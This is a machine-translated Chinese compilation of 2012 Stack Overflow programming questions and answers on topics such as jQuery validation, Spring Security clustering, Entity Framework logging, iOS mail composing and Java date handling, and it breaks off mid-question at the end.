我正在从事大量使用数学计算的文凭项目，并且应该以 3D 形式呈现一些结果。出于这些目的，我决定使用 CUDA 或 OpenCL 来并行计算数学部分，最有可能的是使用 OpenGL 来呈现结果。此外，项目应该能够部署在集群上（由 MS Windows 操作），为此项目主管推荐了 MPI。

我的问题如下：在 MS Visual tudio 中更容易组合所有这些组件

主要部分是CUDA + OpenCL + OpenGL，它将是项目的核心。

PS这个问题不是要在Qt和MS Visual Studio之间进行圣战。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:38:55.267

OpenCL 不仅限于 GPU，它还可以用于集群中的并行编程。例如，英特尔提供了针对多核 CPU 和集群的 OpenCL 实现。

所以我的建议是使用 OpenCL 进行 GPU 计算和集群。MPI（Message Passing Interface）主要是在不同集群节点上运行的任务之间进行通信的一种方式。它本身并不是一个集群框架。

# jsp - jQuery 自定义验证 - 添加错误对象

> ID：13491323
> 
> 赞同：1
> 
> 时间：2012-11-21T10:33:58.063
> 
> 标签：jsp, jquery, jquery-plugins

下面的功能工作得很好。目前，如果用户名不可用，我会提示一条消息“电子邮件 ID 已注册 - 请登录”。

我的查询是，而不是警报，我是否可以将上述消息添加到验证错误对象中，以便默认 errorPlacement 函数选择它（然后在 jsp 上显示错误消息 - 它通常对其他验证失败者执行的方式）？

```
 <script type="text/javascript">
     $(document).ready(function(){

         var formAction = '';
         var userAvailable = '';

         $("#myForm").validate({

             onfocusout:false,
             onkeyup:false,
                 onclick:false,

             rules:{                            
                 j_username:{
                     required: true,
                     email: true,
                     minlength: 8                           
                 }                          
             },
             messages: {                            
                 j_username:{           
                     required: "Please enter a valid email address", 
                     minlength: "Please enter a valid email address"
                 }
             }, 
             // the errorPlacement has to take the table layout into account 
             errorPlacement: function(error, element) {
                 if(element.is(":radio") )
                     error.appendTo( element.parent().next());          
                 else
                     error.appendTo( element.parent());
             }, 
             submitHandler: function(form){

                 if($('#accountNo').is(':checked')){
                     var emailId = $('#userName').val();                
                     isUserNameAvailable(emailId);
                     if(userAvailable=="1"){
                         alert("Email ID already registered - please log in");
                         return false;                  
                     }
                     var loginAction = '/MyApp/articles/add.html';
                     $('#myForm').attr('method','POST');
                     $('#myForm').attr('action',loginAction);
                     form.submit();
                 }
                 else{
                     var loginAction = '/MyApp/j_spring_security_check';    
                     $('#myForm').attr('method','POST');
                     $('#myForm').attr('action',loginAction);
                     form.submit();
                 }         
             }
         });

         //Ajax call to check userName availability returns '1' if userName is available
         function isUserNameAvailable(id) {
           $.ajax({
               url: "isUserAvailable.html",
               data: ({emailId : id}),
               async: false,
               success: function(data) { 
                   userAvailable = data;             
               }          
           });       
         }  
     });

     </script> 
```

我想我可以使用 addMethod() 但不确定。我所指的示例之一如下...

```
 jQuery.validator.addMethod("math", function(value, element, params) { 
      return this.optional(element) || value == params[0] + params[1]; 
     }, jQuery.format("Please enter the correct value for {0} + {1}")); 
```

好的，我使用 adMethod 完成了这项工作。代码如下。

```
 <script type="text/javascript">
     $(document).ready(function(){

var formAction = '';
var response;

$.validator.addMethod("uniqueUserName", function(value, element) {
    var id = $('#userName').val();
    if($('#accountNo').is(':checked')){
      $.ajax({
          url: "isUserAvailable.html",
          data: ({emailId : id}),
          async: false,           
           success: function(msg)
           {
              //If username exists, set response to true
              response = ( msg == '1' ) ? true : false;
           }
        });
   return response;
    }
    else{
        return true;
    }

}, "Username is Already Taken");

$("#myForm").validate({

    onfocusout:false,
    onkeyup:false,
    onclick:false,

    rules:{                         
        j_username:{
            required: true,
            email: true,
            minlength: 8,
            uniqueUserName: true
        }                           
    },
    messages: {                             
        j_username:{            
            required: "Please enter a valid email address", 
            minlength: "Please enter a valid email address",
            uniqueUserName: "Email ID already registered - please log in"
        }
    }, 
    // the errorPlacement has to take the table layout into account 
    errorPlacement: function(error, element) {
        if(element.is(":radio") )
            error.appendTo( element.parent().next());           
        else
            error.appendTo( element.parent());
    }, 
    submitHandler: function(form){

        if($('#accountNo').is(':checked')){             
            var loginAction = '/MyApp/articles/add.html';
            $('#myForm').attr('method','POST');
            $('#myForm').attr('action',loginAction);
            form.submit();
        }
        else{
            var loginAction = '/MyApp/j_spring_security_check'; 
            $('#myForm').attr('method','POST');
            $('#myForm').attr('action',loginAction);
            form.submit();
        }          
    }
}); 
```

});

# c# - 辐射网格表单模板

> ID：13491330
> 
> 赞同：0
> 
> 时间：2012-11-21T10:34:17.203
> 
> 标签：c#, asp.net, telerik-grid

在***Radgrid 中***，基于下拉**选择的索引已更改**，我正在绑定 Radgrid。在那我点击`edit button Form template is opened`和编辑。

下面的第一张图片显示假设我在下拉列表中再次打开了任何记录

> 选择另一个项目，表单模板仍处于打开状态。

![图片1](../Images/ee4d2209a526d90dbfb75e95b109f16e.png)

![图片2](../Images/6eadfc284bb9807fc9d946e39fee1530.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:04:31.330

在 DropDownList 的 SelectIndexChanged 事件中，通过调用以下方法取消 RadGrid 的编辑模式：

```
radGrid1.EditIndexes.Clear(); 
radGrid1.Rebind(); 
```

# c# - 在 C# 应用程序中使用 ch.ethz.ssh2

> ID：13491331
> 
> 赞同：0
> 
> 时间：2012-11-21T10:34:20.553
> 
> 标签：c#, ssh, .net-2.0, asp.net-2.0, sftp

我正在向现有应用程序添加 SSH 命令执行和文件上传。在比较了不同的免费和许可库之后，我决定使用[http://code.google.com/p/ssh2-net/](http://code.google.com/p/ssh2-net/)，因为它似乎是 JAVA 库到 C# 的一个端口。我们已经对 JAVA 版本有很好的体验...

上传文件不是很成功......有人可以帮忙吗？这是我的代码，它是我找到的一些样本的组合

```
Connection conn = StartConnection();    
// --> conn checked and is open!

Session session = conn.openSession();
session.execCommand("sudo mount -o remount,rw /");
// --> no error

SFTPv3Client client = new SFTPv3Client(conn);
// --> this throws error "Cannot access a closed Stream."

SFTPv3FileHandle handle = client.createFile("/tmp/" + sshSource.Name);

using (StreamReader sr = new StreamReader(sshSource.FullName)) 
{
    char[] buffer = new char[1024];
    int offset = 0;

    while (sr.Peek() >= 0)
    {
        int i = sr.Read(buffer, offset, buffer.Length);

        byte[] bytes = new byte[1024];
        for (int j = 0; j < 1024; j++)
            bytes[j] = (byte) buffer[j];

        client.write(handle, offset, bytes, 0, i);
        offset += i;
    }
} 
```

正如评论中提到的，在定义客户端的那一行已经有一个错误 SFTPv3Client client = new SFTPv3Client(conn);

非常感谢您的帮助，弗兰克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T14:30:16.327

切换到 SharpSsh，似乎是 C# 更好（更简单）的解决方案

[http://www.tamirgal.com/blog/page/SharpSSH.aspx](http://www.tamirgal.com/blog/page/SharpSSH.aspx)

```
SshTransferProtocolBase tx = new Scp(_hostname, _username, _password);
SshExec exec = new SshExec(_hostname, _username, _password);

tx.Connect();
exec.Connect();

exec.RunCommand("sudo mount -o remount,rw /");
exec.RunCommand("sudo rm /tmp/" + Path.GetFileName(sshTarget));
tx.Put(sshSource.FullName, "/tmp/" + Path.GetFileName(sshTarget)); 
```

# windows-phone-8 - windows phone 8上的吐司通知没有声音和振动

> ID：13491332
> 
> 赞同：2
> 
> 时间：2012-11-21T10:34:26.837
> 
> 标签：windows-phone-8

我将使用后台代理的定期任务制作一个简单的 toast 通知，我要问的是如何在特定时间显示通知，但不播放声音通知或振动，有什么办法可以实现吗？

由于我在[http://msdn.microsoft.com/en-us/library/hh202962%28v=vs.92%29.aspx](http://msdn.microsoft.com/en-us/library/hh202962%28v=vs.92%29.aspx)看到 VibrateController 在后台代理中是不受支持的 api

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:38:14.370

完全由用户决定他/她是否想要声音和振动。作为开发人员，我们无能为力来控制这些事情。我相信微软的哲学之一是在这些问题上不以 Android 告终。

# apache - Spring security 3并发会话控制在tomcat集群环境中不起作用

> ID：13491335
> 
> 赞同：3
> 
> 时间：2012-11-21T10:34:39.793
> 
> 标签：apache, spring-security, tomcat7

Spring Security 的并发会话控制在 tomcat 7 集群环境中无法正常工作，但在非集群环境中可以正常工作。会话也在 tomcat 中复制。

集群配置：

```
<Cluster channelSendOptions="6" className="org.apache.catalina.ha.tcp.SimpleTcpCluster">
        <Manager className="org.apache.catalina.ha.session.DeltaManager" expireSessionsOnShutdown="false" notifyListenersOnReplication="true"/>
        <Channel className="org.apache.catalina.tribes.group.GroupChannel">
          <Membership address="228.0.0.9" className="org.apache.catalina.tribes.membership.McastService" dropTime="3000" frequency="500" port="45564"/>
          <Receiver address="auto" autoBind="100" className="org.apache.catalina.tribes.transport.nio.NioReceiver" maxThreads="6" port="5008" selectorTimeout="5000"/>
          <Sender className="org.apache.catalina.tribes.transport.ReplicationTransmitter">
            <Transport className="org.apache.catalina.tribes.transport.nio.PooledParallelSender"/>
          </Sender>
          <Interceptor className="org.apache.catalina.tribes.group.interceptors.TcpFailureDetector"/>
          <Interceptor className="org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor"/>
        </Channel>
        <Valve className="org.apache.catalina.ha.tcp.ReplicationValve" filter=""/>
        <Valve className="org.apache.catalina.ha.session.JvmRouteBinderValve"/>
        <Deployer className="org.apache.catalina.ha.deploy.FarmWarDeployer" deployDir="/tmp/war-deploy/" tempDir="/tmp/war-temp/" watchDir="/tmp/war-listen/" watchEnabled="false"/>
        <ClusterListener className="org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener"/>
        <ClusterListener className="org.apache.catalina.ha.session.ClusterSessionListener"/>
      </Cluster> 
```

apache负载均衡的配置：

```
ProxyPass / balancer://domain.foo.net/ lbmethod=byrequests stickysession=JSESSIONID|jsessionid nofailover=Off maxattempts=15
ProxyPreserveHost On
<Proxy balancer://domain.abcprocure.net>
    BalancerMember http://127.0.0.1:8888 max=250 min=45 keepalive=On route=tc02
    BalancerMember http://127.0.0.1:8080 max=250 min=45 keepalive=On route=tc01

</Proxy> 
```

进一步的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T12:01:47.247

默认`SessonRegistry`是内存中的实现，因此您将在每个 JVM 中拥有不同的实现，而不会知道其他的。

您需要以`SessionRegistry`在 VM 之间共享数据的方式实现接口。这可以使用 SQL 数据库、memcached、redis 或最适合您情况的任何东西。

编写完类后，[参考手册](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#concurrent-sessions)将显示如何使用显式`SessionRegistry`bean 配置并发控制。

# ssrs-2008 - 将数据从页脚拉入正文（或新报告）

> ID：13491336
> 
> 赞同：1
> 
> 时间：2012-11-21T10:34:40.400
> 
> 标签：ssrs-2008, reporting-services, ssrs-grouping

我有一份 SSRS 报告。在页脚级别，我显示了添加到报表正文中的表的表索引，因为它包含超过 500 页（表索引来自代码“将报表组名称与页码连接”）。

我需要将这些数据从页脚拉到正文；我不能直接在报表正文部分插入这些数据，因为它包含页码，这是在正文中被禁止的。那么：是否可以读取这些数据并将其插入到新报告中，或者是否有任何其他解决方案可以提供帮助？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T20:13:26.323

报表正文不知道在呈现报表时将生成哪些页面。您无法在报告正文中实现您想要的。

# xml - 哪个 Eclipse XML 编辑器具有在保存时自动重新格式化文件的选项？

> ID：13491337
> 
> 赞同：2
> 
> 时间：2012-11-21T10:34:43.083
> 
> 标签：xml, eclipse

保存 .java 文件时，Eclipse 有一个自动重新格式化选项，但我找不到 .xml 文件的选项。

我知道 Eclipse 有大量的 XML 编辑器，但有哪些可以做到这一点？

# c# - Entity Framework 5 在运行时记录数据库更改

> ID：13491340
> 
> 赞同：4
> 
> 时间：2012-11-21T10:34:54.880
> 
> 标签：c#, .net, entity-framework, linq-to-entities

在 ASP.NET 4.5 C# Entity Framework 5 Code First 项目中，我想记录运行时在数据库中所做的更改（日志记录必须在 asp.net 应用程序中完成，而不是在数据库中）。以前，SQL 语句是由代码构建的，这些语句只是简单地记录下来。现在使用 EF，对象通过 linq 检索到实体，修改和

```
db.SaveChanges(); 
```

正在被调用。我的第一个想法是检索 EF 发送到数据库的实际 SQL 语句——然而，这似乎相当复杂。我找到了许多在调试期间显示 SQL 的“解决方案”，但没有简单的方法让代码在运行时检索它。

因此，我正在寻找任何可以记录所做更改的解决方案（发送到数据库的 SQL [首选]，或对对象所做更改的某种其他形式的文本表示），并且不需要包含许多复杂的调试库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-05T00:11:53.550

你应该试试 FrameLog

[https://bitbucket.org/MartinEden/framelog/wiki/Home](https://bitbucket.org/MartinEden/framelog/wiki/Home)

没有明确说明，但它支持 Entity Framework 5

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:58:14.380

我没有在 EF 4.5 上对此进行测试，因此可能需要对其进行一些调整，但出于调试目的，我发现这篇文章底部编写的扩展方法：

[http://social.msdn.microsoft.com/Forums/en-US/adodotnetentityframework/thread/2a50ffd2-ed73-411d-82bc-c9c564623cb4/](http://social.msdn.microsoft.com/Forums/en-US/adodotnetentityframework/thread/2a50ffd2-ed73-411d-82bc-c9c564623cb4/)

给我实体的正确输出。SaveChanges() 调用。它不需要任何外部库，并且由于它是作为扩展方法编写的，因此不会阻塞您的代码。

# android - 移动到第 2 页 android 后保留最后选择的选项卡

> ID：13491341
> 
> 赞同：0
> 
> 时间：2012-11-21T10:34:54.777
> 
> 标签：android

默认情况下，我的主屏幕上有两个选项卡 tab1 和 tab2 被选中，我选择 tab2 并在我返回时转到其他屏幕我发现 tab1 被选中问题-我希望之前选择的选项卡在转到另一个屏幕时应该保持选中状态

# snmp - snmp 日志位置

> ID：13491342
> 
> 赞同：0
> 
> 时间：2012-11-21T10:34:57.110
> 
> 标签：snmp, net-snmp, snmpd

```
DEBUGMSGTL(("","Initializing scalar integer.  Default value = %d\n"));

snmp_log(LOG_ERR,"fscanf failed in temp fun(),errno:\n"); 
```

有了这些日志，我想要从 snmp 服务的 startinn 到它结束的所有日志。但是不知道去哪里看。

这些日志将保存在哪里？我正在使用 NET-SNMP 版本：5.7.2.rc1

安装时我没有给出任何位置

写入日志文件的位置和写入持久信息的位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T13:15:48.750

这是一个编译时选项[--with-logfile](http://www.pavius.net/2011/02/compiling-net-snmp-for-embedded-linux-using-the-eldk/)。您的包维护者应该为自己记录默认设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-10T05:52:59.467

为了进行调试，需要设置以下功能

```
snmp_set_do_debugging(1); 
```

# iphone - mailComposeDelegate 和简单的 Delegate 属性之间的区别

> ID：13491345
> 
> 赞同：1
> 
> 时间：2012-11-21T10:35:15.590
> 
> 标签：iphone, ios, xcode, ios5, mfmailcomposeviewcontroller

`MFMailComposeViewController`嗨，我对委托属性感到困惑，当我`mailer.mailComposeDelegate`在调用后设置应用程序崩溃`[self presentModalViewController:mailer animated:YES];`时，当我这样做时，`mailer.delegate`应用程序不会崩溃，但它的视图在发送邮件后无法隐藏，或者只是从其导航 bat 按钮“取消”中取消它。我被卡住了为什么会发生这种情况。让我分享代码，你会得到提示我在哪里做错了。

```
if ([MFMailComposeViewController canSendMail])
{
MFMailComposeViewController *mailer = [[MFMailComposeViewController alloc] init];
    if(mailer)
    {
        mailer.mailComposeDelegate = self;
        //mailer.delegate=self;
        [mailer setSubject:@"What the Buck?"];
        imageData = UIImagePNGRepresentation(screenImgSubCat);        

        [mailer addAttachmentData:imageData mimeType:@"image/png" fileName:@"testapp"];        
        NSString *emailBody = @"What the Buck?! – www.testapp.com";
        [mailer setMessageBody:emailBody isHTML:NO];
        [self presentModalViewController:mailer animated:YES];
        //[mailer release];

    }
}
} 
```

**更新**

我更改代码并使用`mailer.mailComposeDelegate = self;`并评论此行 `[mailer release];`仍然让我在加载图像时崩溃。这是我在崩溃后得到的图像。 ![在此处输入图像描述](../Images/f5b42fb42abe7ed28779739f6dc5e070.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:40:11.653

在 .h 文件中添加 `MFMailComposeViewControllerDelegate`

```
@interface VideoPlayAndSharing : UIViewController
<MFMailComposeViewControllerDelegate> 
```

显示作曲表

```
-(void)displayComposerSheet
{
    if ((videodta.length/1024)/1024 < 25)
    {
        NSLog(@"Video size >> %d",videodta.length/1024);
        MFMailComposeViewController *picker = [[MFMailComposeViewController alloc] init];
        picker.mailComposeDelegate = self;

        [picker setSubject:@"Your subject"];

        // Set up recipients
        NSArray *toRecipients = [NSArray arrayWithObject:@"rajneesh071@gmail.com"];
        NSArray *ccRecipients = [NSArray arrayWithObjects:@"second@example.com", @"third@example.com", nil];
        NSArray *bccRecipients = [NSArray arrayWithObject:@"fourth@example.com"];

        [picker setToRecipients:toRecipients];
        [picker setCcRecipients:ccRecipients];
        [picker setBccRecipients:bccRecipients];

        [picker addAttachmentData:videodta mimeType:@"video/mp4" fileName:@"MyPersonalMessage"];

        // Fill out the email body text
        NSString *emailBody = @"Type your message here";
        [picker setMessageBody:emailBody isHTML:NO];
        [self presentModalViewController:picker animated:YES];
    }
    else{
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"My Personal Message"
                                                        message:@"Video exceed the limit of 25 MB"
                                                       delegate:nil
                                              cancelButtonTitle:@"OK"
                                              otherButtonTitles:nil, nil];
        [alert show];
    }
} 
```

和委托方法

```
- (void)mailComposeController:(MFMailComposeViewController*)controller didFinishWithResult:(MFMailComposeResult)result error:(NSError*)error 
{   
    // Notifies users about errors associated with the interface
    switch (result)
    {
        case MFMailComposeResultCancelled:
            message.text = @"Result: canceled";
            break;
        case MFMailComposeResultSaved:
            message.text = @"Result: saved";
            break;
        case MFMailComposeResultSent:
            message.text = @"Result: sent";
            break;
        case MFMailComposeResultFailed:
            message.text = @"Result: failed";
            break;
        default:
            message.text = @"Result: not sent";
            break;
    }
    [self dismissViewControllerAnimated:YES completion:nil];
} 
```

**编辑**

`picker.mailComposeDelegate`它的代表`MFMailComposeViewControllerDelegate`

它的回应`- (void)mailComposeController`

`picker.delegate`它的代表`UINavigationControllerDelegate`

它不响应导航控制器`- (void)mailComposeController`，所以取消点击它不会调用，这就是你的`MFMailComposeViewController`视图没有隐藏的原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:45:29.423

首先在您的 .h 文件中添加 MFMailComposeViewControllerDelegate 委托，然后再次检查。还有 mailer.mailComposeDelegate = self; 正确的方法不是 mailer.delegate=self 也在你的代码中改变它然后检查。

# 在 .m 中导入 MessageUI/MFMailComposeViewController.h，带有小于号和大于号，并添加 MessageUI.framework。

```
NSArray *toRecipients = [NSArray arrayWithObject:@"vishal@ldh.01s.in"]; 
[mail setToRecipients:toRecipients]; 
```

在设置消息正文之前添加这两行，然后检查。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:53:13.330

评论以下行[邮件发布]；

我认为它导致了问题

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T11:04:52.837

检查标题 - 委托属性是类型`id <UINavigationControllerDelegate>`- 因为邮件作曲家继承自它，因此，由于作曲家的内部恶作剧，将其设置为某个东西可能是一个坏主意，以获取邮件作曲家状态的通知将自我设置为作曲家的 mailComposeDelegate。

# javascript - jQuery保存元素最后一个dom位置

> ID：13491353
> 
> 赞同：1
> 
> 时间：2012-11-21T10:35:33.427
> 
> 标签：javascript, jquery, dom, drag-and-drop, element

我正在制作一个拖放系统，它允许我移动一个元素并将其放置在其他元素旁边。现在有时我需要在处理一些逻辑后恢复元素移动。

```
$(this).draggable({

stop: function() {
    $(this).appendTo(someElement);
}

}); 
```

然后我将如何将元素重置回其预拖动位置？喜欢

```
$(this).appendTo(previousPosition); 
```

如何获取元素的先前位置？

# python - 如何使谷歌数据存储中的字段唯一

> ID：13491356
> 
> 赞同：0
> 
> 时间：2012-11-21T10:35:42.583
> 
> 标签：python, django, google-app-engine

是否有可能使 name=db.StringProperty(unique=True) ?...任何其他方式使其独一无二。？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:42:26.393

The `get_or_insert` will ensure uniqueness of the record via it's key.

```
Model.get_or_insert (key_name, **kwds) 
```

> Attempts to get the entity of the model's kind with the given key name. If it exists, get_or_insert() simply returns it. If it doesn't exist, a new entity with the given kind, name, and parameters in kwds is created, stored, and returned. The get and subsequent (possible) put operations are wrapped in a transaction to ensure atomicity. Ths means that get_or_insert() will never overwrite an existing entity, and will insert a new entity if and only if no entity with the given kind and name exists.

[Get_Or_Insert](https://developers.google.com/appengine/docs/python/datastore/modelclass#Model_get_or_insert)

# stored-procedures - sybase - 从 proc 调用临时表上的 sp_help

> ID：13491358
> 
> 赞同：1
> 
> 时间：2012-11-21T10:35:45.353
> 
> 标签：stored-procedures, sybase, temp-tables, sp-help-operator

我有几个嵌套程序。第一个临时表正在创建，后来在几个地方使用。目前我已经在临时表上创建了一个索引，但需要验证，因为我仍然看到它运行很长时间。

我试图在存储过程之后复制我的问题

```
create proc ProcSp
as
    sp_help #tmpCheck
    go
END
go 
```

我收到错误“sp_help 附近的语法不正确”。

请让我知道我们如何能够调用`sp_help`proc 内的临时表？

### 编辑

有没有办法只在proc内的任何表上显示索引？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:45:40.597

sp_help 是一个存储过程，因此需要通过[exec调用所有存储过程](http://infocenter.sybase.com/help/topic/com.sybase.infocenter.dc36272.1570/html/commands/X30305.htm)

但是在这种情况下，如果您想确认索引已经创建，那么最好在创建索引时检查它。通过在创建索引后查看变量来执行此`@@error`操作，如果它为零，则索引是正确的

例如

```
create index idx_temp on #tmpCheck(field)
set @err_code = @@error
if @err_code <> 0
begin
   print @err_code
   rollback ......
end 
```

# iis - ASP.Net 应用程序的高可用性

> ID：13491362
> 
> 赞同：1
> 
> 时间：2012-11-21T10:35:53.940
> 
> 标签：iis, azure, cloud, cloud-hosting, high-availability

我们有一种情况，我需要为我们使用 ASP.Net 3.5 制作的应用程序之一提供高可用性解决方案。

客户预计在给定时间大约有 50,000 人访问该应用程序，然后我们粗略地预计该应用程序有大约 5% 的同时点击。

典型的交易包括填写好的表格和附加的大约 20mb 的文件。

我想知道以下内容：

1.  我在哪里可以获得支持上述使用要求的 IIS 的吞吐量/性能信息？

2.  我的客户有自己的数据中心，他们希望在他们的基础架构上保持一个实例运行。

考虑到这一要求，我是否可以在云上运行其他实例（最好是 Windows Azure）并对所有这些实例进行负载平衡，包括客户端数据中心中的实例？如果是这样，我该如何实现？

欢迎对给定场景提出任何其他建议。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T16:24:31.897

ASP.NET 运行网络上一些最大的网站..DELL、MySpace、Microsoft 等。

当你说 ASP.NET.. 它可能意味着很多事情。我假设您在谈论 Web 表单，但您可能有很多 Ajax 与 Web 服务等对话。

您可以将 ASP.NET 扩展到数百万用户，以下是 ASP.NET 3.5 的示例： [http ://www.slideshare.net/oazabir/scaling-aspnet-websites-to-millions-of-users#btnNext](http://www.slideshare.net/oazabir/scaling-aspnet-websites-to-millions-of-users#btnNext)

在不了解您的架构设计的情况下很难回答您的问题。下意识的回答是肯定的，它可以扩展到您的用户数量。我已经将 ASP.NET 扩展到了那个程度。

* * *

Azure 绝对可以用来进一步扩展网站。事实上，许多大型网站都有自己的托管，然后在必要时扩展到云（即 Zynga 使用 Amazon）或 Apple 使用 Microsoft 和 Amazon 将 iCloud 扩展到两个云。Azure 包含一个无状态负载平衡器，因此可以在基于会话的 Web 表单上进行粘性会话和自定义负载平衡。但您需要：1）在本地编写一个小型软件负载平衡服务器以适当地路由请求或 2）存储您在 Azure 缓存、Azure 表存储、SQL Azure 等“公共区域”中的会话状态（基本上不是 InProc 会话状态）。Azure AppFabric 缓存包括可以替换 InProc 缓存的模块。

您还可以编写一个“哑”负载均衡器，其中一些客户端始终在云中，而另一些则始终托管。那会容易很多。

# entity-framework-4 - 如何为作为实体框架中主键的实体属性设置特定值？

> ID：13491364
> 
> 赞同：0
> 
> 时间：2012-11-21T10:35:54.567
> 
> 标签：entity-framework-4

我正在尝试创建一个新实体并将其保存回数据库，但是我需要为 ID 列设置一个特定值。但是，当我调用 SaveChanges() 并生成插入语句时，尽管我在创建新实体并将新实体添加到当前上下文时指定了一个值，但它会自动生成一个新 ID。

如果有帮助，该列当前在 SSDL 和 CSDL 内容中将 StoreGeneratedPattern 属性设置为“Identity”（我已经在 XML 中的 .edmx 中检查了这一点）。

关于为什么会发生这种情况的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:07:51.380

如果您的属性已`StoreGenerationPattern`设置为`Identity`EF，则该值将始终在数据库中设置。你不能改变它。如果它有效，也意味着您的数据库已配置为自动为您生成 ID。

如果您想从应用程序中设置值，您必须`StoreGeneratedPattern`设置为`None`并且您的数据库绝不能生成该值。您每次都必须设置唯一键值。

# java - 如何使用java判断一天是否过去

> ID：13491365
> 
> 赞同：0
> 
> 时间：2012-11-21T10:35:54.760
> 
> 标签：java, calendar

我有一个字符串，其中包含天的名称，我只想在那串天中看到它，也就是即将到来的一天。例如，字符串包含“Sun,Mon,Tue,Fri,Sat”，如果今天是星期三，它应该只返回 fri。任何人都知道如何做到这一点？目前我正在做这件事，但它似乎也回归了太阳，尽管星期天已经过去了。

```
 static String[] strDays = new String[] { "Sun", "Mon", "Tue", "Wed", "Thu",
        "Fri", "Sat" };

    String nexday="sun,mon,tue,fri,sat";     
    String nexdayone[] = nexday.split(",");
    Calendar now = Calendar.getInstance();
    Calendar futurecal = Calendar.getInstance();
    for (int i = 0; i < nexdayone.length; i++) {
        for (int j = 0; j < 7; j++) {
            if (strDays[j].equalsIgnoreCase(nexdayone[i])) {

                futurecal.set(Calendar.DAY_OF_WEEK, j);
                if (futurecal.after(now)) {
                    Log.d(now.get(Calendar.DAY_OF_WEEK)+" --after-- "+j,""+strDays[j]);
                    break;
                }
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:46:22.247

所以你想在你的字符串中找到从今天开始的下一个工作日？

我会做一个描述一周的散列，并总是指向一个“假”的散列值

```
Sun->false
Mon->false
Tue->false
Wed->false
Thu->false
Fri->false
Sat->false 
```

不，爆炸你的字符串，你可以在哈希中将该字符串中的所有出现设置为真。对于您的示例，这将是

```
Sun->true
Mon->true
Tue->true
Wed->false
Thu->false
Fri->true
Sat->true 
```

现在您可以从当前的工作日（日历）开始并遍历哈希，直到您获得“真”的哈希值。实现真实的关键将是您寻找的工作日！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:39:09.323

试试[乔达时间](http://joda-time.sourceforge.net/)。它是一个很棒的 java 日期/时间计算库。

`String`要`Date`在 Java 中解析，请使用[SimpleDateFormat](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html) (`parse`方法)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T11:01:45.197

使用 SortedSet 查找第二天的解决方案。

```
private static SimpleDateFormat fmt = new SimpleDateFormat("E");

public static void main(String[] args) throws Exception {
    // Put the days in the list into a sorted set
    TreeSet<Integer> daySet = new TreeSet<Integer>();
    for (String day : "Sun,Mon,Tue,Fri,Sat".split(",")) {
        daySet.add(dayOfWeek(day));
    }

    // Find the next day in the list, starting from today
    Calendar cal = Calendar.getInstance();
    int today = cal.get(Calendar.DAY_OF_WEEK);
    cal.set(Calendar.DAY_OF_WEEK, findNext(daySet, today));
    System.out.println(fmt.format(cal.getTime()));
}

/**
 * Parses a day name, and returns the number of the day in the week.
 */
private static int dayOfWeek(String day) {
    Calendar cal = Calendar.getInstance();
    cal.setTime(fmt.parse(day, new ParsePosition(0)));
    return cal.get(Calendar.DAY_OF_WEEK);
}

/**
 * Finds a value in the sorted set that is greater than 'from'.
 * If there are no greater values, return the first value.
 */
private static int findNext(SortedSet<Integer> set, int from) {
    SortedSet<Integer> tail = set.tailSet(Integer.valueOf(from));
    return tail.isEmpty() ? set.first() : tail.first();
} 
```

假设今天是星期二。我不确定是周二还是周五回来。上面的解决方案将打印“Tue”。如果您需要“星期五”，即不是今天的第二天，您可以使用：

`Integer.valueOf(from + 1)`在`findNext`.

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-21T10:49:13.853

```
Try this.

 public static void main(String a[]){
 String days [] = {"Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"};
    Date d = new Date();
    SimpleDateFormat  st = new SimpleDateFormat ("EEEEE");
    String day = st.format(d);
    for(int i=0;i<days.length;i++){
        if(days[i].equals(day)){
            System.out.println(days[i+2]);
            break;
        }
    }
} 
```

# deployment - 在 Windows 上部署 QT 快速桌面应用程序

> ID：13491370
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:36:15.210
> 
> 标签：deployment, desktop, qml

我在 Windows 7 操作系统上使用 QT 快速桌面组件编写了一个了不起的 QML 和 C++ 桌面应用程序，现在我必须部署它，我希望它可以在任何其他机器上工作 - 安装或没有安装 QT，但我不不知道该怎么做，我从来没有部署过 QT 应用程序，更何况 - 使用插件的 QT Quick 应用程序。

有什么明确的方法吗？

提前谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T14:53:34.407

[这](http://doc.qt.digia.com/stable/deployment-windows.html)是 Qt 文档站点中的一个简单指南。

这也是谷歌搜索“Qt deploy windows”的第一个结果。

# android - 如何像在已弃用的画廊中一样在 Horizo ntalScrollView 中制作中心锁定图像？

> ID：13491371
> 
> 赞同：1
> 
> 时间：2012-11-21T10:36:23.237
> 
> 标签：android, android-layout, horizontalscrollview

我在 Horizo​​ntalScrollView 中有 LinearLayout。

```
 <?xml version="1.0" encoding="utf-8"?>
